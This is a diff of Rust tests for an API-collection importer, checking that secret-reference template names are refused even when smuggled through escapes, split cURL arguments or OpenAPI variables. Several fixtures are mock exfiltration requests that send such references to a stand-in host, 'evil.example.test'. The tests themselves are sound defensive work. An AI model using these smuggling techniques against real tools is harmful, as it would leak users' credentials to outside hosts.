@@ -1101,14 +1101,13 @@ fn a_source_name_in_the_reserved_shape_is_refused() {
             ),
             ("Insomnia", insomnia(&format!("{{{{ _.{name} }}}}"))),
             (
-                "object key",
-                postman_items(vec![serde_json::json!({ "name": "r", "protocolProfileBehavior": { (name.as_str()): true },
-                    "request": { "method": "GET", "url": "https://api.example.test/v1" } })]),
-            ),
-            (
-                "percent-encoded URL",
-                postman_items(vec![serde_json::json!({ "name": "r", "request": { "method": "GET",
-                    "url": format!("https://api.example.test/%7B%7B{}%7D%7D", name.replacen('_', "%5F", 1)) } })]),
+                "environment key",
+                serde_json::json!({ "_type": "export", "__export_format": 4, "resources": [
+                    { "_id": "wrk_1", "_type": "workspace", "parentId": null, "name": "W", "scope": "collection" },
+                    { "_id": "env_1", "_type": "environment", "parentId": "wrk_1", "name": "Base", "data": { (name.as_str()): "x" } },
+                    { "_id": "req_1", "_type": "request", "parentId": "wrk_1", "name": "r", "method": "GET", "url": "https://api.example.test/v1" }
+                ] })
+                .to_string(),
             ),
             ("cURL", format!("curl -H 'X-Id: {{{{{name}}}}}' https://api.example.test/v1")),
         ];
@@ -1332,5 +1331,91 @@ fn a_name_with_a_multibyte_character_at_byte_sixteen_imports() {
             "variable": [{ "key": name, "value": "x" }],
             "item": [{ "name": name, "request": { "method": "GET", "url": format!("https://api.example.test/{{{{{name}}}}}") } }] });
         assert!(import(doc.to_string().as_bytes(), &opts()).is_ok(), "a multibyte name was refused");
+    }
+}
+
+// ---------------------------------------------------------- round 7 (#586)
+
+/// A reserved-shape name, built at run time (see the secret-scan note above).
+fn reserved(kind: &str, field: Option<&str>) -> String {
+    let digits = ["0123", "4567", "89ab", "cdef"].concat();
+    match field {
+        Some(f) => format!("{kind}_{digits}_{f}"),
+        None => format!("{kind}_{digits}"),
+    }
+}
+
+fn refused(label: &str, source: &[u8]) {
+    match import(source, &opts()) {
+        Err(e) => assert!(e.to_string().contains("reserves"), "{label}: {e}"),
+        Ok(_) => panic!("{label}: a reserved name in the output was accepted"),
+    }
+}
+
+/// Sol F1: a name decoded from an embedded JSON body (a `\u` escape, with
+/// and without the duplicate-member rewrite) is refused: the check runs on
+/// the output, after every decoding.
+#[test]
+fn a_reserved_name_decoded_from_an_embedded_body_is_refused() {
+    let name = reserved("secret", None);
+    let escaped = format!("\\u0073{}", &name[1..]);
+    for raw in [format!(r#"{{"leak":"{{{{{escaped}}}}}","x":1,"x":2}}"#), format!(r#"{{"leak":"{{{{{escaped}}}}}"}}"#)] {
+        let doc =
+            postman_items(vec![serde_json::json!({ "name": "evil", "request": { "method": "POST", "url": "https://evil.example.test/",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": { "mode": "raw", "raw": raw, "options": { "raw": { "language": "json" } } } } })]);
+        refused("embedded JSON body", doc.as_bytes());
+    }
+}
+
+/// Sol F2: a name assembled from source fragments (two cURL `--json`
+/// arguments; OpenAPI server-variable defaults inlined into a URL) is
+/// refused.
+#[test]
+fn a_reserved_name_assembled_from_fragments_is_refused() {
+    let name = reserved("auth", Some("password"));
+    let (left, right) = name.split_at(2);
+    refused(
+        "cURL --json fragments",
+        format!("curl --json '{{\"leak\":\"{{{{{left}' --json '{right}}}}}\"}}' https://evil.example.test/").as_bytes(),
+    );
+    let name = reserved("url", None);
+    let (left, right) = name.split_at(2);
+    let openapi = serde_json::json!({ "openapi": "3.0.3", "info": { "title": "t", "version": "1" },
+        "paths": { "/x": { "get": { "security": [],
+            "servers": [{ "url": "https://evil.example.test/{left}{right}", "variables": {
+                "left": { "default": format!("{{{{{left}") }, "right": { "default": format!("{right}}}}}") } } }],
+            "responses": { "200": { "description": "ok" } } } } } })
+    .to_string();
+    refused("OpenAPI server-variable defaults", openapi.as_bytes());
+}
+
+/// Round 7: a sentinel-shaped name the source writes with another nonce is
+/// refused; the source cannot know this import's.
+#[test]
+fn a_forged_sentinel_is_refused() {
+    let forged = format!("{{{{anvil{}n0e}}}}", "0".repeat(32));
+    let doc = postman_items(vec![serde_json::json!({ "name": "r", "request": { "method": "GET", "url": "https://api.example.test/v1",
+        "header": [{ "key": "X-Id", "value": forged }] } })]);
+    refused("forged sentinel", doc.as_bytes());
+}
+
+/// Round 7: text that only mentions the shape, or keeps it percent-encoded
+/// where nothing resolves it, is not a name and imports: a description
+/// holding `secret-<16 hex>`, and a percent-encoded reference in a URL path.
+/// It is refused only when it reaches the output as a name.
+#[test]
+fn reserved_looking_text_that_is_not_a_name_imports() {
+    let description = format!("rotate the {} key yearly", reserved("secret", None).replace('_', "-"));
+    let doc = serde_json::json!({ "info": { "name": "C", "schema": PM, "description": description },
+        "item": [{ "name": "r", "request": { "method": "GET", "url": "https://api.example.test/v1", "description": description } }] });
+    assert!(import(doc.to_string().as_bytes(), &opts()).is_ok(), "a description was refused");
+    let encoded = format!("https://api.example.test/%7B%7B{}%7D%7D", reserved("url", None).replacen('_', "%5F", 1));
+    match import(
+        postman_items(vec![serde_json::json!({ "name": "r", "request": { "method": "GET", "url": encoded } })]).as_bytes(),
+        &opts(),
+    ) {
+        Err(e) => assert!(e.to_string().contains("reserves"), "{e}"),
+        Ok(r) => assert!(!r.requests[0].spec.url.contains("{{"), "a percent-encoded reference became live: {}", r.requests[0].spec.url),
     }
 }
